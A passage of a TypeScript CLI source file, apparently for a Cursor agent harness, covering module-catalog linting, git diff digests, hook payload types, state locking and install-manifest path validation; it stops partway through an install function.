#!/usr/bin/env node
import { createHash } from "node:crypto";
import {
  appendFileSync,
  closeSync,
  cpSync,
  existsSync,
  openSync,
  readSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  realpathSync,
  renameSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { homedir, tmpdir } from "node:os";
import { basename, dirname, isAbsolute, relative, resolve, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";

type JsonValue = string | number | boolean | null | JsonValue[] | { [key: string]: JsonValue };

type OptionValue = string | boolean;
type CliOptions = Record<string, OptionValue>;

interface ParsedArgs {
  options: CliOptions;
  positional: string[];
}

interface ProcessResult {
  ok: boolean;
  stdout: string;
  stderr: string;
}

interface FileEntry {
  path: string;
  sha256: string;
  bytes: number;
}

interface Manifest {
  version: number;
  harness_version: string;
  hash: string;
  files: FileEntry[];
  digest: string;
}

interface ModuleDefinition {
  id: string;
  paths: string[];
  dependsOn?: string[];
  verification?: string[];
  owners?: string[];
  /** Import specifier prefixes that resolve to this module, e.g. `@acme/core` or `acme.core`. */
  provides?: string[];
  /** Directory the module lives in; `paths` are interpreted relative to it when set. */
  root?: string;
  /** Marks a module every other module depends on in practice, so changes fan out. */
  shared?: boolean;
  /** Quality attributes this module must hold evidence for, and how strongly. */
  attributes?: Partial<Record<QualityAttribute, AttributeRequirement>>;
  /** Module IDs this module must never import, enforced against real import edges. */
  forbiddenDependencies?: string[];
  /** Architectural layer name, checked against the catalog's declared layer order. */
  layer?: string;
}

interface IgnoredPaths {
  paths: string[];
  reason: string;
}

interface ContextBudget {
  totalChars?: number;
  fileChars?: number;
  diffChars?: number;
  maxFiles?: number;
}

interface ModuleCatalog {
  version: number;
  modules: ModuleDefinition[];
  /** Paths whose change affects every module, such as a lockfile or a root build config. */
  globalPaths?: string[];
  /** Paths deliberately excluded from impact. A reason is required so exclusions stay reviewable. */
  ignored?: IgnoredPaths[];
  contextPack?: ContextBudget;
  maxTrackedPaths?: number;
  /** Layer names from the outermost inward. A layer may only depend on later entries. */
  layers?: string[];
  /** How long a runtime-class result stays acceptable, since it cannot bind to a diff. */
  runtimeValidityHours?: number;
}

type PathClassification = "global" | "mapped" | "ignored" | "overlap" | "unmapped";

interface ClassifiedPath {
  path: string;
  classification: PathClassification;
  module: string | null;
  reason?: string;
}

const CATCH_ALL_PATTERNS = new Set(["", ".", "*", "**", "**/*", "./**"]);

function moduleSpecificity(pattern: string): number {
  return pattern.replace(/[*?]/g, "").length;
}

function moduleEffectivePaths(module: ModuleDefinition): string[] {
  const root = (module.root || "").replace(/\/+$/, "");
  if (!root || root === ".") return module.paths || [];
  return (module.paths || []).map((pattern) =>
    pattern.startsWith(`${root}/`) || pattern === root ? pattern : `${root}/${pattern}`,
  );
}

// Ordering is deliberate: an explicit repo-wide declaration outranks a module claim, a module
// claim outranks an exclusion, and anything left over is treated as unknown rather than safe.
function classifyPath(definition: ModuleCatalog, path: string): ClassifiedPath {
  const candidate = posix(path);
  if (matchesPath(candidate, definition.globalPaths || [])) {
    return { path: candidate, classification: "global", module: null };
  }
  let best: ModuleDefinition | null = null;
  let bestScore = -1;
  let tied = false;
  for (const module of definition.modules) {
    for (const pattern of moduleEffectivePaths(module)) {
      if (!matchesPath(candidate, [pattern])) continue;
      const score = moduleSpecificity(pattern);
      if (score > bestScore) {
        best = module;
        bestScore = score;
        tied = false;
      } else if (score === bestScore && best && best.id !== module.id) {
        tied = true;
      }
    }
  }
  if (best && tied) return { path: candidate, classification: "overlap", module: best.id };
  if (best) return { path: candidate, classification: "mapped", module: best.id };
  for (const entry of definition.ignored || []) {
    if (matchesPath(candidate, entry.paths || [])) {
      return { path: candidate, classification: "ignored", module: null, reason: entry.reason };
    }
  }
  return { path: candidate, classification: "unmapped", module: null };
}

function trackedPaths(root: string): { paths: string[]; truncated: boolean; isGit: boolean } {
  if (!gitAvailable(root)) return { paths: [], truncated: false, isGit: false };
  const result = git(root, ["ls-files", "-z"], true);
  if (!result.ok) return { paths: [], truncated: false, isGit: false };
  const all = splitNulPaths(result.stdout);
  const limit = Number(catalog(root).maxTrackedPaths) > 0 ? Number(catalog(root).maxTrackedPaths) : 100_000;
  return { paths: all.slice(0, limit), truncated: all.length > limit, isGit: true };
}

function catalogLint(options: CliOptions): void {
  const root = targetFrom(options);
  const definition = catalog(root);
  const failures: Array<{ code: string; detail: string }> = [];
  const warnings: string[] = [];

  const ids = new Set<string>();
  for (const module of definition.modules) {
    if (!module.id || ids.has(module.id)) {
      failures.push({ code: "DUPLICATE_ID", detail: `Module IDs must be unique: ${module.id || "<empty>"}` });
    }
    ids.add(module.id);
    if (!Array.isArray(module.paths) || module.paths.length === 0) {
      failures.push({ code: "NO_PATHS", detail: `Module ${module.id} declares no paths.` });
    }
    for (const [attribute, requirement] of Object.entries(module.attributes || {})) {
      if (!QUALITY_ATTRIBUTES.includes(attribute as QualityAttribute)) {
        failures.push({
          code: "UNKNOWN_ATTRIBUTE",
          detail: `Module ${module.id} declares unknown quality attribute ${attribute}.`,
        });
        continue;
      }
      const { tier, reason } = normalizeRequirement(requirement);
      if (!ATTRIBUTE_TIERS.includes(tier)) {
        failures.push({
          code: "UNKNOWN_TIER",
          detail: `Module ${module.id} sets ${attribute} to unknown tier ${tier}. Use one of: ${ATTRIBUTE_TIERS.join(", ")}.`,
        });
        continue;
      }
      // Opting out is allowed and often correct, but it has to be a recorded decision rather
      // than the quiet default that every attribute drifts toward.
      if ((tier === "none" || tier === "minimal") && !reason.trim()) {
        failures.push({
          code: "UNJUSTIFIED_TIER",
          detail: `Module ${module.id} sets ${attribute} to "${tier}" without a reason. Use {"tier":"${tier}","reason":"..."}.`,
        });
      }
    }
    for (const forbidden of module.forbiddenDependencies || []) {
      if (forbidden === module.id) {
        failures.push({
          code: "SELF_FORBIDDEN",
          detail: `Module ${module.id} forbids depending on itself.`,
        });
      }
    }
    if (module.layer && definition.layers && !definition.layers.includes(module.layer)) {
      failures.push({
        code: "UNKNOWN_LAYER",
        detail: `Module ${module.id} is in layer ${module.layer}, which the catalog does not declare.`,
      });
    }
    for (const pattern of module.paths || []) {
      if (CATCH_ALL_PATTERNS.has(pattern.trim())) {
        failures.push({
          code: "CATCH_ALL",
          // A module that claims the whole tree makes coverage look complete while hiding
          // every path nobody actually assigned an owner or a check to.
          detail: `Module ${module.id} uses the catch-all pattern "${pattern}", which masks coverage gaps.`,
        });
      }
    }
  }
  for (const module of definition.modules) {
    for (const dependency of module.dependsOn || []) {
      if (!ids.has(dependency)) {
        failures.push({ code: "DANGLING_DEP", detail: `Module ${module.id} depends on unknown module ${dependency}.` });
      }
    }
  }
  for (const entry of definition.ignored || []) {
    if (!entry.reason || !String(entry.reason).trim()) {
      failures.push({ code: "IGNORED_WITHOUT_REASON", detail: `Ignored paths ${JSON.stringify(entry.paths)} need a reason.` });
    }
  }
  const declaredGraph = new Map<string, Set<string>>(
    definition.modules.map((module) => [module.id, new Set(module.dependsOn || [])]),
  );
  for (const cycle of detectCycles(declaredGraph)) {
    warnings.push(`Declared dependency cycle: ${cycle.join(" -> ")}`);
  }

  const tracked = trackedPaths(root);
  const explicit = String(options.paths || "").split(",").filter(Boolean);
  const subjects = [...new Set([...tracked.paths, ...explicit])];
  const entries = subjects.map((path) => classifyPath(definition, path));
  const counts = { mapped: 0, global: 0, ignored: 0, unmapped: 0, overlap: 0 };
  for (const entry of entries) counts[entry.classification] += 1;

  const unmappedPaths = entries.filter((item) => item.classification === "unmapped").map((item) => item.path);
  const overlapPaths = entries.filter((item) => item.classification === "overlap").map((item) => item.path);
  for (const path of unmappedPaths.slice(0, 50)) {
    failures.push({ code: "UNMAPPED", detail: `No module, global path, or ignore rule covers ${path}.` });
  }
  for (const path of overlapPaths.slice(0, 50)) {
    failures.push({ code: "OVERLAP", detail: `More than one module claims ${path} at the same specificity.` });
  }
  // Truncating the detail list is fine; truncating it silently would understate the gap.
  if (unmappedPaths.length > 50) {
    warnings.push(`${unmappedPaths.length - 50} further unmapped paths are not listed individually.`);
  }
  if (overlapPaths.length > 50) {
    warnings.push(`${overlapPaths.length - 50} further overlapping paths are not listed individually.`);
  }
  if (!tracked.isGit) warnings.push("Git is unavailable; coverage was checked only for explicitly supplied paths.");
  if (tracked.truncated) warnings.push("Tracked path list was truncated; coverage is incomplete.");

  const ok = failures.length === 0;
  printJson({
    command: "catalog lint",
    target: root,
    ok,
    total: entries.length,
    counts,
    unmapped_paths: unmappedPaths.slice(0, 500),
    overlapping_paths: overlapPaths.slice(0, 500),
    failures,
    warnings,
  });
  if (!ok) process.exitCode = 1;
}

// ISO/IEC 25010 sub-characteristics, narrowed to the ones a repository can hold evidence for.
const QUALITY_ATTRIBUTES = [
  "security",
  "resilience",
  "privacy",
  "safety",
  "reliability",
  "availability",
  "performance",
  "maintainability",
] as const;

type QualityAttribute = (typeof QUALITY_ATTRIBUTES)[number];

// Six strengths so a module can be held to the standard it actually warrants. Uniform strictness
// is its own defect: it makes prototypes expensive and pushes teams to disable checks wholesale.
const ATTRIBUTE_TIERS = ["critical", "high", "medium", "low", "minimal", "none"] as const;
type AttributeTier = (typeof ATTRIBUTE_TIERS)[number];

type AttributeEnforcement = "block" | "warn" | "record" | "listed" | "opted-out";

const TIER_ENFORCEMENT: Record<AttributeTier, AttributeEnforcement> = {
  critical: "block",
  high: "block",
  medium: "warn",
  low: "record",
  minimal: "listed",
  none: "opted-out",
};

/** A tier alone, or a tier with the justification that `none` and `minimal` require. */
type AttributeRequirement = AttributeTier | { tier: AttributeTier; reason?: string };

function normalizeRequirement(value: AttributeRequirement): { tier: AttributeTier; reason: string } {
  if (typeof value === "string") return { tier: value, reason: "" };
  return { tier: value.tier, reason: String(value.reason || "") };
}

/** Only `critical` is beyond waiver; every other tier can be deferred with an owned waiver. */
function tierIsWaivable(tier: AttributeTier): boolean {
  return tier !== "critical";
}

interface CheckDefinition {
  class?: string;
  command?: string;
  required?: boolean;
  timeoutMs?: number;
  /** Which quality attributes a passing run of this check is evidence for. */
  attributes?: QualityAttribute[];
}

interface VerificationMatrix {
  version: number;
  checks: Record<string, CheckDefinition>;
}

interface DiffBinding {
  base_commit: string;
  diff_sha256: string;
}

type Permission = "allow" | "ask" | "deny";

interface HookOutput {
  permission?: Permission;
  user_message?: string;
  agent_message?: string;
  followup_message?: string;
  additional_context?: string;
  env?: Record<string, string>;
}

interface HookPayload {
  command?: string;
  tool_name?: string;
  tool_input?: unknown;
  file_path?: string;
  status?: string;
  loop_count?: number;
  session_id?: string;
  conversation_id?: string;
  generation_id?: string;
  modified_files?: string[];
  workspace_roots?: string[];
}

const VERSION = "1.0.0";
const STATE_REL = ".cursor/harness-state";
const INSTALL_MANIFEST_REL = `${STATE_REL}/install-manifest.json`;
const SOURCE_MANIFEST_REL = "FRAMEWORK-MANIFEST.json";
const EVENTS = [
  "beforeShellExecution",
  "beforeMCPExecution",
  "beforeReadFile",
  "preToolUse",
  "afterFileEdit",
  "afterShellExecution",
  "subagentStart",
  "subagentStop",
  "preCompact",
  "stop",
  "sessionStart",
];

const SECURITY_EVENTS = [
  "beforeShellExecution",
  "beforeMCPExecution",
  "beforeReadFile",
  "preToolUse",
];
const INSTALL_ROOT_FILES = new Set([
  ".cursorignore",
  ".cursorindexingignore",
  "AGENTS.md",
  "scripts/harness.mjs",
]);

function findHarnessRoot(start: string): string {
  let current = resolve(start);
  while (true) {
    if (
      existsSync(resolve(current, "harness/default-module-catalog.json")) &&
      existsSync(resolve(current, "scripts/harness.mjs"))
    ) {
      return current;
    }
    const parent = dirname(current);
    if (parent === current) {
      throw new Error("Cannot locate the harness root.");
    }
    current = parent;
  }
}

const HARNESS_ROOT = findHarnessRoot(dirname(fileURLToPath(import.meta.url)));

// Installing copies `harness/` and `scripts/harness.mjs`, so an installed repository also
// satisfies findHarnessRoot. Only the source checkout carries `src/harness.mts`.
function isHarnessSourceRoot(root: string): boolean {
  return existsSync(resolve(root, "src/harness.mts"));
}

function posix(value: string): string {
  return value.split(sep).join("/");
}

function normalizeLf(value: string): string {
  return value.replace(/\r\n?/g, "\n");
}

function sha256(value: string | Buffer): string {
  return createHash("sha256").update(value).digest("hex");
}

function errorMessage(error: unknown): string {
  return error instanceof Error ? error.message : String(error);
}

function readJson(path: string): any {
  try {
    return JSON.parse(readFileSync(path, "utf8"));
  } catch (error) {
    throw new Error(`Invalid JSON at ${path}: ${errorMessage(error)}`);
  }
}

// A partially written state file is worse than a missing one, because every later read
// treats it as authoritative. Writes therefore land through a rename, which is atomic.
function writeJson(path: string, value: unknown): void {
  mkdirSync(dirname(path), { recursive: true });
  const temporary = `${path}.${process.pid}.${Date.now()}.tmp`;
  writeFileSync(temporary, `${JSON.stringify(value, null, 2)}\n`, "utf8");
  renameSync(temporary, path);
}

const LOCK_STALE_MS = 60_000;
const LOCK_WAIT_MS = 10_000;

// Several hook processes can run at once, and each one read-modify-writes shared state.
// Without a lock the last writer silently discards whatever the others recorded.
function withStateLock<T>(root: string, name: string, action: () => T): T {
  const directory = resolve(root, STATE_REL, "locks");
  mkdirSync(directory, { recursive: true });
  const lockPath = resolve(directory, `${name}.lock`);
  const token = `${process.pid}-${Date.now()}-${Math.random().toString(36).slice(2)}`;
  const deadline = Date.now() + LOCK_WAIT_MS;

  for (;;) {
    try {
      writeFileSync(lockPath, JSON.stringify({ token, pid: process.pid, created_at: Date.now() }), {
        encoding: "utf8",
        flag: "wx",
      });
      break;
    } catch (error) {
      if ((error as NodeJS.ErrnoException).code !== "EEXIST") throw error;
      let holder: { created_at?: number } = {};
      try {
        holder = JSON.parse(readFileSync(lockPath, "utf8"));
      } catch {
        holder = {};
      }
      const age = Date.now() - Number(holder.created_at || 0);
      if (age > LOCK_STALE_MS) {
        rmSync(lockPath, { force: true });
        continue;
      }
      if (Date.now() > deadline) {
        throw new Error(`Timed out waiting for the ${name} state lock.`);
      }
      // Busy-wait briefly; hooks are short-lived and a sleep dependency is not worth it.
      const until = Date.now() + 25;
      while (Date.now() < until) {
        /* spin */
      }
    }
  }

  try {
    return action();
  } finally {
    try {
      const holder = JSON.parse(readFileSync(lockPath, "utf8"));
      if (holder?.token === token) rmSync(lockPath, { force: true });
    } catch {
      rmSync(lockPath, { force: true });
    }
  }
}

function parseArgs(argv: string[]): ParsedArgs {
  const options: CliOptions = {};
  const positional: string[] = [];
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (!token.startsWith("--")) {
      positional.push(token);
      continue;
    }
    const equal = token.indexOf("=");
    if (equal !== -1) {
      options[token.slice(2, equal)] = token.slice(equal + 1);
      continue;
    }
    const key = token.slice(2);
    if (index + 1 < argv.length && !argv[index + 1].startsWith("--")) {
      options[key] = argv[index + 1];
      index += 1;
    } else {
      options[key] = true;
    }
  }
  return { options, positional };
}

function boolOption(options: CliOptions, key: string): boolean {
  const value = options[key];
  return value === true || value === "true" || value === "1";
}

function targetFrom(options: CliOptions): string {
  return resolve(String(options.target || process.cwd()));
}

// Node's default pipe limit is 1 MiB. A repository large enough to matter exceeds that on a
// routine `git ls-files`, and the truncated result is indistinguishable from "nothing found".
const PROCESS_MAX_BUFFER = 256 * 1024 * 1024;

function run(
  command: string,
  args: string[],
  cwd: string,
  allowFailure = false,
): ProcessResult {
  const result = spawnSync(command, args, {
    cwd,
    encoding: "utf8",
    windowsHide: true,
    maxBuffer: PROCESS_MAX_BUFFER,
  });
  if (result.error) {
    const code = (result.error as NodeJS.ErrnoException).code;
    // Output that did not fit is a broken measurement, never an empty one. Reporting it as
    // absent would let a truncated diff pass for a verified one.
    if (code === "ENOBUFS") {
      throw new Error(
        `${command} ${args[0] ?? ""} produced more than ${PROCESS_MAX_BUFFER} bytes; the result cannot be trusted.`,
      );
    }
    if (allowFailure) return { ok: false, stdout: "", stderr: result.error.message };
    throw new Error(`Unable to run ${command}: ${result.error.message}`);
  }
  const output = {
    ok: result.status === 0,
    stdout: normalizeLf(result.stdout || ""),
    stderr: normalizeLf(result.stderr || ""),
  };
  if (!output.ok && !allowFailure) {
    throw new Error(
      `${command} ${args.join(" ")} failed: ${(output.stderr || output.stdout).trim()}`,
    );
  }
  return output;
}

function git(cwd: string, args: string[], allowFailure = false): ProcessResult {
  return run("git", args, cwd, allowFailure);
}

const gitReadiness = new Map<string, boolean>();

// Two different situations were previously conflated: a directory that is not a repository,
// which is a legitimate degraded mode, and a git command that failed, which must fail closed.
// Memoized because it used to spawn a subprocess on every call, several times per hook.
function gitAvailable(cwd: string): boolean {
  const key = resolve(cwd);
  const cached = gitReadiness.get(key);
  if (cached !== undefined) return cached;
  const ready =
    git(cwd, ["--version"], true).ok &&
    git(cwd, ["rev-parse", "--is-inside-work-tree"], true).stdout.trim() === "true";
  gitReadiness.set(key, ready);
  return ready;
}

function gitBase(cwd: string, requested?: OptionValue): string {
  if (!gitAvailable(cwd)) return "NO_GIT";
  const candidate = requested || "HEAD";
  const result = git(cwd, ["rev-parse", "--verify", `${candidate}^{commit}`], true);
  if (result.ok) return result.stdout.trim();
  if (requested) throw new Error(`Invalid Git base: ${requested}.`);
  return "NO_COMMIT";
}

function changedPaths(cwd: string, base?: string): string[] {
  if (!gitAvailable(cwd)) return [];
  const args =
    base && base !== "NO_COMMIT" && base !== "NO_GIT"
      ? ["diff", "--name-only", "-z", "--relative", base, "--", "."]
      : ["status", "--porcelain=v1", "-z", "--untracked-files=all"];
  const result = git(cwd, args, true);
  // Failing to list changes is not the same as there being none. Returning an empty set here
  // would report an unverified change set as fully verified.
  if (!result.ok) {
    throw new Error(`Unable to determine changed paths: ${(result.stderr || "git failed").trim()}`);
  }
  const excludeState = (path: string) => path !== STATE_REL && !path.startsWith(`${STATE_REL}/`);
  if (args[0] === "status") {
    // With `-z`, porcelain v1 emits `XY <path>` NUL, and a rename adds the old path as its own
    // NUL-terminated record, so the record after an R or C status is consumed rather than parsed.
    const records = result.stdout.split("\0").filter(Boolean);
    const paths: string[] = [];
    for (let index = 0; index < records.length; index += 1) {
      const record = records[index];
      if (record.length < 4) continue;
      const status = record.slice(0, 2);
      paths.push(posix(record.slice(3)));
      if (/[RC]/.test(status) && index + 1 < records.length) {
        paths.push(posix(records[index + 1]));
        index += 1;
      }
    }
    return paths.filter(excludeState);
  }
  const tracked = splitNulPaths(result.stdout).filter(excludeState);
  return [...new Set([...tracked, ...untrackedPaths(cwd)])].sort();
}

const DIFF_EXCLUDE = `:(exclude)${STATE_REL}/**`;

function diffArgumentSets(base: string): string[][] {
  const tail = ["--", ".", DIFF_EXCLUDE];
  const common = ["diff", "--binary", "--no-ext-diff", "--relative"];
  if (base !== "NO_COMMIT" && base !== "NO_GIT") {
    return [[...common, base, ...tail]];
  }
  if (base === "NO_COMMIT") {
    return [
      ["diff", "--cached", "--binary", "--no-ext-diff", "--relative", ...tail],
      [...common, ...tail],
    ];
  }
  return [];
}

// `--output` has to precede the `--` separator; placed after it, git treats the value as a
// pathspec and writes nothing, which is indistinguishable from an empty diff.
function withDiffOutput(args: string[], output: string): string[] {
  const separator = args.indexOf("--");
  const at = separator === -1 ? args.length : separator;
  return [...args.slice(0, at), `--output=${output}`, ...args.slice(at)];
}

/** Streaming CRLF normalization, carrying a trailing `\r` across chunk boundaries. */
function normalizeLfChunk(chunk: Buffer, carry: boolean): { text: string; carry: boolean } {
  let value = chunk.toString("binary");
  if (carry) value = `\r${value}`;
  const endsWithCr = value.endsWith("\r");
  if (endsWithCr) value = value.slice(0, -1);
  return { text: value.replace(/\r\n?/g, "\n"), carry: endsWithCr };
}

// The diff is written to a file rather than piped, so its size is bounded by disk rather than by
// a pipe buffer. Hashing it in chunks keeps a multi-hundred-megabyte diff out of memory.
function canonicalDiffDigest(cwd: string, base: string): string {
  if (!gitAvailable(cwd)) {
    return sha256(
      normalizeLf(
        `NO_GIT\n${snapshotFiles(cwd).map((entry) => `${entry.path}\0${entry.sha256}`).join("\n")}`,
      ),
    );
  }
  const hash = createHash("sha256");
  const scratch = mkdtempSync(resolve(tmpdir(), "cursor-harness-diff-"));
  try {
    let index = 0;
    for (const args of diffArgumentSets(base)) {
      const output = resolve(scratch, `part-${index}`);
      index += 1;
      const produced = git(cwd, withDiffOutput(args, output), true);
      if (!produced.ok) {
        throw new Error(`Unable to compute the canonical diff: ${(produced.stderr || "git failed").trim()}`);
      }
      if (!existsSync(output)) continue;
      const descriptor = openSync(output, "r");
      try {
        const buffer = Buffer.allocUnsafe(1024 * 1024);
        let carry = false;
        for (;;) {
          const read = readSync(descriptor, buffer, 0, buffer.length, null);
          if (read === 0) break;
          const normalized = normalizeLfChunk(buffer.subarray(0, read), carry);
          carry = normalized.carry;
          hash.update(normalized.text, "binary");
        }
        if (carry) hash.update("\n", "binary");
      } finally {
        closeSync(descriptor);
      }
    }
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
  for (const path of untrackedPaths(cwd)) {
    const absolute = resolve(cwd, path);
    if (!existsSync(absolute) || !statSync(absolute).isFile()) continue;
    const bytes = readFileSync(absolute);
    hash.update(`\n-- cursor-harness-untracked:${posix(path)}:${sha256(bytes)}:${bytes.length} --\n`);
  }
  return hash.digest("hex");
}

// `git` escapes and quotes any path containing a non-ASCII byte unless the output is
// NUL-separated. Splitting on NUL keeps a CJK filename usable instead of turning it into an
// octal string that no pattern can ever match.
function splitNulPaths(value: string): string[] {
  return value.split("\0").filter(Boolean).map(posix);
}

function untrackedPaths(cwd: string): string[] {
  const result = git(cwd, ["ls-files", "-z", "--others", "--exclude-standard", "--", "."], true);
  if (!result.ok) {
    throw new Error("Unable to enumerate untracked files; the diff binding cannot be trusted.");
  }
  return splitNulPaths(result.stdout)
    .filter((path) => path !== STATE_REL && !path.startsWith(`${STATE_REL}/`))
    .sort();
}

/** Bounded diff text, for callers that display it rather than bind to it. */
function canonicalDiffText(cwd: string, base: string, limit: number): string {
  if (!gitAvailable(cwd)) return "";
  const scratch = mkdtempSync(resolve(tmpdir(), "cursor-harness-text-"));
  try {
    let collected = "";
    let index = 0;
    for (const args of diffArgumentSets(base)) {
      if (collected.length >= limit) break;
      const output = resolve(scratch, `part-${index}`);
      index += 1;
      git(cwd, withDiffOutput(args, output), true);
      if (!existsSync(output)) continue;
      const descriptor = openSync(output, "r");
      try {
        const buffer = Buffer.allocUnsafe(Math.min(limit + 1, 8 * 1024 * 1024));
        const read = readSync(descriptor, buffer, 0, buffer.length, 0);
        collected += normalizeLf(buffer.subarray(0, read).toString("utf8"));
      } finally {
        closeSync(descriptor);
      }
    }
    return collected.slice(0, limit);
  } finally {
    rmSync(scratch, { recursive: true, force: true });
  }
}

function binding(cwd: string, requestedBase?: OptionValue): DiffBinding {
  const base_commit = gitBase(cwd, requestedBase);
  return {
    base_commit,
    diff_sha256: canonicalDiffDigest(cwd, base_commit),
  };
}

function globRegex(pattern: string): RegExp {
  let source = "";
  for (let index = 0; index < pattern.length; index += 1) {
    const char = pattern[index];
    if (char === "*" && pattern[index + 1] === "*") {
      source += ".*";
      index += 1;
    } else if (char === "*") {
      source += "[^/]*";
    } else if (char === "?") {
      source += "[^/]";
    } else {
      source += char.replace(/[|\\{}()[\]^$+?.]/g, "\\$&");
    }
  }
  return new RegExp(`^${source}$`);
}

function matchesPath(path: string, patterns: string[]): boolean {
  const candidate = posix(path).replace(/^\.\//, "");
  return patterns.some((pattern: string) => {
    const normalized = posix(pattern).replace(/^\.\//, "");
    if (globRegex(normalized).test(candidate)) return true;
    // The prefix fallback must stop at a path separator. Without it the pattern `src` also
    // claimed `srcbackup/`, so a module silently owned a directory it never declared.
    const prefix = normalized.endsWith("/**")
      ? normalized.slice(0, -2)
      : normalized.endsWith("/")
        ? normalized
        : `${normalized}/`;
    return candidate.startsWith(prefix);
  });
}

// `excludeTests` exists only for the install manifest, which must not ship the harness's own
// tests. Every other caller enumerates the real tree, so a task owning `tests/**` gets a
// baseline and arch-check can see test code.
function walkFiles(root: string, current: string = root, excludeTests = false): string[] {
  if (!existsSync(current)) return [];
  const files: string[] = [];
  for (const entry of readdirSync(current, { withFileTypes: true })) {
    const absolute = resolve(current, entry.name);
    const rel = posix(relative(root, absolute));
    if (
      entry.isDirectory() &&
      (entry.name === ".git" ||
        entry.name === "node_modules" ||
        (excludeTests && (rel === "tests" || rel.startsWith("tests/"))))
    ) {
      continue;
    }
    if (entry.isDirectory()) {
      files.push(...walkFiles(root, absolute, excludeTests));
    } else if (
      entry.isFile() &&
      !entry.name.endsWith(".cursor-harness-new") &&
      (!rel.startsWith(`${STATE_REL}/`) || rel === `${STATE_REL}/.gitignore`)
    ) {
      files.push(absolute);
    }
  }
  return files;
}

function isInstallable(root: string, absolute: string): boolean {
  const rel = posix(relative(root, absolute));
  if (INSTALL_ROOT_FILES.has(rel)) return true;
  if (rel.startsWith("harness/")) return true;
  if (!rel.startsWith(".cursor/")) return false;
  return !rel.startsWith(`${STATE_REL}/`) || rel === `${STATE_REL}/.gitignore`;
}

function snapshotFiles(root: string, installableOnly = false): FileEntry[] {
  return walkFiles(root, root, true)
    .filter((absolute: string) => !installableOnly || isInstallable(root, absolute))
    .map((absolute: string): FileEntry => {
      const path = posix(relative(root, absolute));
      const raw = readFileSync(absolute);
      const text = raw.includes(0) ? raw : Buffer.from(normalizeLf(raw.toString("utf8")), "utf8");
      return { path, sha256: sha256(text), bytes: text.length };
    })
    .sort((left: FileEntry, right: FileEntry) => left.path.localeCompare(right.path));
}

function sourceManifest(): Manifest {
  const files = snapshotFiles(HARNESS_ROOT, true);
  return {
    version: 1,
    harness_version: VERSION,
    hash: "sha256-lf-v1",
    files,
    digest: manifestDigest(files),
  };
}

function manifestDigest(files: FileEntry[]): string {
  return sha256(files.map((entry: FileEntry) => `${entry.path}\0${entry.sha256}\n`).join(""));
}

function assertSafeTarget(target: string): void {
  const parsedRoot = resolve(target, sep);
  if (resolve(target) === parsedRoot) {
    throw new Error("Refusing to manage a filesystem root.");
  }
  if (resolve(target) === resolve(homedir())) {
    throw new Error("Refusing to manage the user home directory; choose a repository target.");
  }
}

function isWithin(root: string, candidate: string): boolean {
  const rel = relative(root, candidate);
  return rel === "" || (!rel.startsWith(`..${sep}`) && rel !== ".." && !isAbsolute(rel));
}

function safeManagedPath(target: string, managedPath: unknown): string {
  if (
    typeof managedPath !== "string" ||
    !managedPath ||
    isAbsolute(managedPath) ||
    /^[a-zA-Z]:[\\/]/.test(managedPath) ||
    /^[/\\]{2}/.test(managedPath)
  ) {
    throw new Error(`Unsafe managed path: ${String(managedPath)}.`);
  }
  const segments = managedPath.split(/[\\/]/);
  if (segments.some((segment) => segment === ".." || segment === "")) {
    throw new Error(`Unsafe managed path: ${managedPath}.`);
  }
  const root = resolve(target);
  const destination = resolve(root, ...segments);
  if (!isWithin(root, destination) || destination === root) {
    throw new Error(`Managed path escapes target: ${managedPath}.`);
  }
  const physicalRoot = existsSync(root) ? realpathSync(root) : root;
  let current = root;
  for (const segment of segments) {
    current = resolve(current, segment);
    let metadata;
    try {
      metadata = lstatSync(current);
    } catch (error) {
      if ((error as NodeJS.ErrnoException).code === "ENOENT") break;
      throw error;
    }
    let physical;
    try {
      physical = realpathSync(current);
    } catch (error) {
      if (metadata.isSymbolicLink()) {
        throw new Error(`Managed path contains an unsafe dangling symlink: ${managedPath}.`);
      }
      throw error;
    }
    if (!isWithin(physicalRoot, physical)) {
      throw new Error(`Managed path resolves outside target: ${managedPath}.`);
    }
  }
  return destination;
}

function validateInstallManifest(target: string, value: any): Manifest {
  if (
    value?.version !== 1 ||
    typeof value.harness_version !== "string" ||
    value.hash !== "sha256-lf-v1" ||
    !Array.isArray(value.files) ||
    typeof value.digest !== "string"
  ) {
    throw new Error("Install manifest has invalid required fields.");
  }
  const seen = new Set();
  for (const entry of value.files) {
    if (
      !entry ||
      typeof entry.path !== "string" ||
      !/^[a-f0-9]{64}$/.test(entry.sha256 || "") ||
      !Number.isInteger(entry.bytes) ||
      entry.bytes < 0 ||
      seen.has(entry.path)
    ) {
      throw new Error(`Install manifest has an invalid file entry: ${entry?.path || "<unknown>"}.`);
    }
    safeManagedPath(target, entry.path);
    seen.add(entry.path);
  }
  if (!/^[a-f0-9]{64}$/.test(value.digest) || value.digest !== manifestDigest(value.files)) {
    throw new Error("Install manifest digest is invalid.");
  }
  return value;
}

function fileHash(path: string): string | null {
  if (!existsSync(path) || !statSync(path).isFile()) return null;
  const raw = readFileSync(path);
  return sha256(raw.includes(0) ? raw : normalizeLf(raw.toString("utf8")));
}

function copyNormalized(source: string, destination: string): void {
  mkdirSync(dirname(destination), { recursive: true });
  const raw = readFileSync(source);
  if (raw.includes(0)) {
    cpSync(source, destination);
  } else {
    writeFileSync(destination, normalizeLf(raw.toString("utf8")), "utf8");
  }
}

function conflictSidecar(target: string, destination: string, sourceHash: string): string {
  const preferred = safeManagedPath(
    target,
    posix(relative(target, `${destination}.cursor-harness-new`)),
  );
  if (!existsSync(preferred) || fileHash(preferred) === sourceHash) return preferred;
  const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
  let candidate = safeManagedPath(
    target,
    posix(relative(target, `${preferred}-${sourceHash.slice(0, 12)}-${timestamp}`)),
  );
  let suffix = 1;
  while (existsSync(candidate)) {
    candidate = safeManagedPath(
      target,
      posix(relative(target, `${preferred}-${sourceHash.slice(0, 12)}-${timestamp}-${suffix}`)),
    );
    suffix += 1;
  }
  return candidate;
}

interface InstallOperation {
  path: string;
  action: string;
  sidecar?: string;
}

function installLike(action: string, options: CliOptions): void {
  const target = targetFrom(options);
  const dryRun = boolOption(options, "dry-run");
  assertSafeTarget(target);
  if (
    resolve(target) === resolve(HARNESS_ROOT) ||
    (existsSync(target) && realpathSync(target) === realpathSync(HARNESS_ROOT))
